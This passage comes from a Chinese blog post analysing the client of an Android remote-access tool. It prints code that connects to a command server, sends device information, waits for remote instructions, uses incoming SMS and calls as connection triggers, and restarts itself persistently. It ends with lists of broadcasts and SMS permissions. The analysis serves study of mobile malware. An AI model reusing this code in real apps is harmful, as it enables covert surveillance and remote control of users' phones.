			&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;intent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getExtras&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;PORT&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;		
		
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;isRunning&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;// C'est la première fois qu'on le lance&lt;/span&gt;
			
		  	&lt;span class=&quot;c1&quot;&gt;//--- On ne passera qu'une fois ici ---&lt;/span&gt;
		    &lt;span class=&quot;n&quot;&gt;IntentFilter&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filterc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IntentFilter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;android.net.conn.CONNECTIVITY_CHANGE&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//Va monitorer la connexion&lt;/span&gt;
		    &lt;span class=&quot;n&quot;&gt;registerReceiver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ConnectivityCheckReceiver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filterc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;isRunning&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//On se connecte et on lance les threads&lt;/span&gt;
			
			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;waitTrigger&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//On attends un evenement pour se connecter au serveur&lt;/span&gt;
			  	&lt;span class=&quot;c1&quot;&gt;//On ne fait rien&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;registerSMSAndCall&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
			&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;先从intent参数中提取action（还记得前面开机启动和主界面类中的setAction方法吗？），然后在日志里打印此时服务是被哪个向量触发的，这样写应该是为了方便调试，比较容易找到出现问题的模块。后面是从intent中抽取ip和port（如果有的话），判断服务是否已经运行了，如果没有则创建网络连接变化监听（这是为了在切换网络连接的时候，可以重新建立监听）。在后面，置inRunning为true，创建连接，如果在配置中设定了是否开启来电或短信提醒触发Client启动，则使用registerSMSAndCall方法，注册短信监听和来电监听（关于这两个监听触发的代码，我们留着后面再分析，这次我们先重点看Client的逻辑）。registerSMSAndCall代码如下：&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;registerSMSAndCall&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;IntentFilter&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IntentFilter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;addAction&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;android.provider.Telephony.SMS_RECEIVED&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//On enregistre un broadcast receiver sur la reception de SMS&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;registerReceiver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SMSreceiver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;IntentFilter&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filter2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IntentFilter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;filter2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;addAction&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;android.intent.action.PHONE_STATE&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//TelephonyManager.ACTION_PHONE_STATE_CHANGED); //On enregistre un broadcast receiver sur la reception de SMS&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;registerReceiver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Callreceiver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filter2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;下面我们再来看witTrigger设置为false时的处理代码：&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;Log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TAG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Try to connect to &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;:&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
					&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CommandPacket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
					&lt;span class=&quot;n&quot;&gt;readthread&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Runnable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;waitInstruction&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;});&lt;/span&gt;
					&lt;span class=&quot;n&quot;&gt;readthread&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//On commence vraiment a écouter&lt;/span&gt;
					&lt;span class=&quot;n&quot;&gt;CommandPacket&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CommandPacket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Protocol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;CONNECT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;infos&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getBasicInfos&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
					&lt;span class=&quot;n&quot;&gt;handleData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;					
					&lt;span class=&quot;c1&quot;&gt;//gps = new GPSListener(this, LocationManager.NETWORK_PROVIDER,(short)4); //!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!&lt;/span&gt;
					&lt;span class=&quot;n&quot;&gt;isListening&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
					&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;waitTrigger&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
						&lt;span class=&quot;n&quot;&gt;unregisterReceiver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SMSreceiver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//On désenregistre SMS et Call pour éviter tout appel inutile&lt;/span&gt;
						&lt;span class=&quot;n&quot;&gt;unregisterReceiver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Callreceiver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
						&lt;span class=&quot;n&quot;&gt;waitTrigger&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
					&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
				&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
					&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;isConnected&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//On programme le AlarmListener car y a un probleme coté serveur&lt;/span&gt;
						&lt;span class=&quot;n&quot;&gt;resetConnectionAttempts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
						&lt;span class=&quot;n&quot;&gt;reconnectionAttempts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
					&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
					&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//On attend l'update du ConnectivityListener pour se débloquer &lt;/span&gt;
						&lt;span class=&quot;n&quot;&gt;Log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;w&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TAG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Not Connected wait a Network update&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
					&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
				&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;如果连接建立成功，实例化CommandPacket用于处理Server端的命令，然后建立一个监听线程，等待Server端命令（对于Client如何和Server交互，我会作为下一篇文章的重点来讲）。然后获取系统基础信息进行封装，通过handleData方法发送至Server端。下面是handleData方法的代码：&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;handleData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;channel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;channel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;后面设置监听判断为true，如果在配置中设定了是否开启来电或短信提醒触发Client启动，则卸载SMSreceiver和Callreceiver模块（已经建立连接了，不再需要监听），设置waitTrigger为false。&lt;/p&gt;

&lt;p&gt;如果连接建立失效则重置连接，然后尝试重新连接。&lt;/p&gt;

&lt;p&gt;我们来看onStartCommand最后的这一段代码：&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;		&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//Le service a déjà été lancé&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;isListening&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;Log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;w&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TAG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Called uselessly by: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;who&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; (already listening)&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
			&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//Sa veut dire qu'on a reçu un broadcast sms ou call&lt;/span&gt;
				&lt;span class=&quot;c1&quot;&gt;//On est ici soit par AlarmListener, ConnectivityManager, SMS/Call ou X&lt;/span&gt;
				&lt;span class=&quot;c1&quot;&gt;//Dans tout les cas le but ici est de se connecter&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;Log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TAG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Connection by : &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;who&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
					&lt;span class=&quot;n&quot;&gt;readthread&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Runnable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;waitInstruction&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;});&lt;/span&gt;
					&lt;span class=&quot;n&quot;&gt;readthread&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//On commence vraiment a écouter&lt;/span&gt;
					&lt;span class=&quot;n&quot;&gt;CommandPacket&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CommandPacket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Protocol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;CONNECT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;infos&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getBasicInfos&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
					&lt;span class=&quot;n&quot;&gt;handleData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
					&lt;span class=&quot;n&quot;&gt;isListening&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
					&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;waitTrigger&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
						&lt;span class=&quot;n&quot;&gt;unregisterReceiver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SMSreceiver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
						&lt;span class=&quot;n&quot;&gt;unregisterReceiver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Callreceiver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
						&lt;span class=&quot;n&quot;&gt;waitTrigger&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//In case of disconnect does not wait again for a trigger&lt;/span&gt;
					&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
				&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//On a encore une fois pas réussi a se connecter&lt;/span&gt;
					&lt;span class=&quot;n&quot;&gt;reconnectionAttempts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Va relancer l'alarmListener&lt;/span&gt;
				&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
			&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
		&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
		 
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;START_STICKY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;如果服务已经运行，判断是否已经开启监听，如果没有开启，则重复之前那段代码的工作。不同的只是在连接失败时不进行重置连接的功能，只尝试重新连接。&lt;/p&gt;

&lt;h2 id=&quot;0x05-总结&quot;&gt;0x05 总结&lt;/h2&gt;

&lt;p&gt;到这里这篇文章的任务已经完成了，下一篇文章我将重点分析Server端对Client发送的命令是如何被处理的。&lt;/p&gt;

&lt;p&gt;在分析的过程中，对于各种广播的理解完全靠官方文档，英文理解起来也没有中文省力，所以打算整理一份比较全面的Android中广播和权限的中文说明。我会先在每篇文章最后添加我新已经理解的广播或者权限的对照说明。&lt;/p&gt;

&lt;p&gt;&lt;em&gt;PS.结尾吐槽一下，写这种文章真心好累，不过对于整体的梳理和一些分析过程中的盲点细节有很好的补充，算是有苦有甜吧。&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x06-广播对照说明&quot;&gt;0x06 广播对照说明&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;开机广播：android.intent.action.BOOT_COMPLETED&lt;/li&gt;
  &lt;li&gt;打入电话广播：android.intent.action.PHONE_STATE&lt;/li&gt;
  &lt;li&gt;打出电话广播：android.intent.action.NEW_OUTGOING_CALL&lt;/li&gt;
  &lt;li&gt;SMS消息提醒广播：android.provider.Telephony.SMS_RECEIVED&lt;/li&gt;
  &lt;li&gt;2g、3g、wifi等网络切换广播：android.net.conn.CONNECTIVITY_CHANGE&lt;/li&gt;
  &lt;li&gt;进入主界面广播：android.intent.action.MAIN&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;0x07-权限对照说明&quot;&gt;0x07 权限对照说明&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;获知短信到来权限：android.permission.RECEIVE_SMS&lt;/li&gt;
  &lt;li&gt;读取短信权限：android.permission.READ_SMS&lt;/li&gt;
  &lt;li&gt;发送短信权限：android.permission.SEND_SMS&lt;/li&gt;
  &lt;li&gt;访问电话状态权限：android.permission.READ_PHONE_STATE&lt;/li&gt;
